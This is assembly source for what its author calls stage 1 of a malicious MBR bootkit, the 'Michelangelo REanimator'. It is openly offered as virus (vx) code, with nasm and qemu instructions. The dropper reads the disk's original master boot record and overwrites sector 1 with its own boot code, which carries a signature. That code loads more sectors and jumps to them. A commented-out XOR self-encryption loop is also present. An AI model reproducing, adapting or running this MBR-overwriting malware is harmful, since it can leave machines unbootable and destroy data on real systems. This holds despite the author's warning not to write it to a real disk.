[bits 16]
;.286			;masm specific
;.MODEL TINY		;masm specific


;******************************************************************************
;	This is the working demo of stage 1 of the malicious MBR/boot sector
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************

.CODE:
;org 0x7C00
org 0x100

;******************************************************************************
SCREEN_WIDTH		equ	0x140							;;320
SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
SCALED_SCREEN_W		equ	0x20*SCALE_MULTIPLIER			;;320 / 10
SCALED_SCREEN_H		equ	0x14*SCALE_MULTIPLIER			;;200 / 10 
OFFSET_SCREEN_H		equ SCALED_SCREEN_H*SCREEN_WIDTH
SECTOR_SIZE			equ 0x200
SCALE_MULTIPLIER	equ 4

VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
PART_TABLE_OFS				equ $-VX_BOOT+0x1BE
OG_MBR_PART_TABLE_OFS		equ $-OG_MBR_Buffer+0x1BE



read_OG_MBR:
	push cs
	pop es
	push cs
	pop ds	
	
	xor ax, ax
	int 13h

	mov ax, 0x201	;read original MBR of disk
	mov ch, 0
	mov cl, 1		;cylinder 0, sector 1 
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	;mov bx, 0x200
	mov bx, OG_MBR_Buffer
	int 13h

	rsvp:
		mov cx, 0x200
		mov si, OG_MBR_Buffer
		push cs
		pop ds
	welcome:
		mov al, [si]
		mov bh, 0
		mov bl, 0x0F
		mov ah, 0x0E
		int 0x10
		inc si
		dec cx
		jnz welcome
		;jmp key_check



	;mov di, PART_TABLE_OFS
	;mov si, OG_MBR_PART_TABLE_OFS
	;mov cx, 0x40		;copy partition table from OG MBR
	;repnz movsb			;to new vx MBR

	mov ax, 0x301	;write one sector of disk
	mov ch, 0		;cylinder 0, sector 1
	mov cl, 0x1		;cylinder 0, sector 1
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	mov bx, vxstart	;with new vx MBR
	int 13h

	mov ax, 0x301	;read one sector of disk
	mov ch, 0		;cylinder 0, sector 1
	mov cl, 0x3		;cylinder 0, sector 3
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	mov bx, OG_MBR_Buffer
	int 13h

exitbb:
	mov ax, 0x4c00
	int 21h
			
		;loop:
		;	mov word ax, [bx]
		;	mov word [es:di], ax
		;	add bx,2
		;	add di,2
		;	dec cx
		;	cmp cx, 0
		;	jnz loop
		;repnz

vxstart:
jmp $+5
;vx signature: xoxo
signature:
db 0x78,0x6f,0x78,0x6f

VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		ax, 0x7c00
mov		sp, ax
sti

;crypt:
;	push cs
;	pop es
;	push cs
;	pop ds
;	mov	si, $-virstart
;	mov	di, $-virstart
;	;lea	bx, virstart
;	mov cx, (VXend-virstart)
;	;mov cx, len
;	crypt_loop:
;		lodsb
;		;xor [bx], 12h
;		xor al, 12h
;		stosb
;		loop crypt_loop
;	
;
;virstart equ $
load_vx_paint:
	mov ax, 0x0		;reset disk
	int 13h
	push cs
	pop es
	push cs
	pop ds
;	mov [DefaultDisk], dl
	mov ax, 0x0900
	mov es, ax
	mov ds, ax

	mov cx, 0x2
	push cx
	
	xor di, di
	xor si, si
	read_sector:
		mov ax, 0x215	;read twenty one sectors of disk
		mov ch, 0
		mov cl, 4		;cylinder 0, sector 4 
		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
		mov bx, 0x200
		int 13h
		
		inc cl
		mov byte [sector_count], cl
		mov cx, 2400
		loop:
			mov word ax, [bx]
			mov word [es:di], ax
			add bx,2
			add di,2
			dec cx
			cmp cx, 0
			jnz loop
		repnz
	jmp boot2nd:0

sector_count:
	db 0x04

num_sectors:
	dw 0x0

sector_num equ sector_count+num_sectors

DefaultDisk:
	db 0xD

boot2nd equ 0x900
	
VXend:
	times 510-($-$$) db 0
	db 0x55
	db 0xAA

OG_MBR_Buffer:
	times 512-($-$$) db 0
			
		;loop:
		;	mov word ax, [bx]
		;	mov word [es:di], ax
		;	add bx,2
		;	add di,2
		;	dec cx
		;	cmp cx, 0
		;	jnz loop
		;repnz
;
;vxstart:
;jmp $+5
;;vx signature: xoxo
;signature:
;db 0x78 0x6f 0x78 0x6f
;
;VX_BOOT:
;cli
;xor 	ax,ax
;mov 	ds,ax
;mov 	es,ax
;mov 	ss,ax
;mov		ax, 0x7c00
;mov		sp, ax
;sti
;
;crypt:
;	push cs
;	pop es
;	push cs
;	pop ds
;	mov	si, $-virstart
;	mov	di, $-virstart
;	;lea	bx, virstart
;	mov cx, (VXend-virstart)
;	;mov cx, len
;	encrypt_loop:
;		lodsb
;		;xor [bx], 12h
;		xor al, 12h
;		stosb
;		loop decrypt_loop
;	
;
;virstart equ $
;load_vx_paint:
;	mov ax, 0x0		;reset disk
;	int 13h
;	push cs
;	pop es
;	push cs
;	pop ds
;;	mov [DefaultDisk], dl
;	mov ax, 0x0900
;	mov es, ax
;	mov ds, ax
;
;	mov cx, 0x2
;	push cx
;	
;	xor di, di
;	xor si, si
;	read_sector:
;		mov ax, 0x215	;read twenty one sectors of disk
;		mov ch, 0
;		mov cl, 3		;cylinder 0, sector 3 
;		mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
;		mov bx, 0x200
;		int 13h
;		
;		inc cl
;		mov byte [sector_count], cl
;		mov cx, 2400
;		loop:
;			mov word ax, [bx]
;			mov word [es:di], ax
;			add bx,2
;			add di,2
;			dec cx
;			cmp cx, 0
;			jnz loop
;		repnz
;	jmp boot2nd:0
;
;sector_count:
;	db 0x03
;
;num_sectors:
;	dw 0x0
;
;sector_num equ sector_count+num_sectors
;
;DefaultDisk:
;	db 0xD
;
;boot2nd equ 0x900
;	
;VXend:
;	times 510-($-$$) db 0
;	db 0x55
;	db 0xAA
;
;OG_MBR_Buffer:
;	times 512-($-$$) db 0
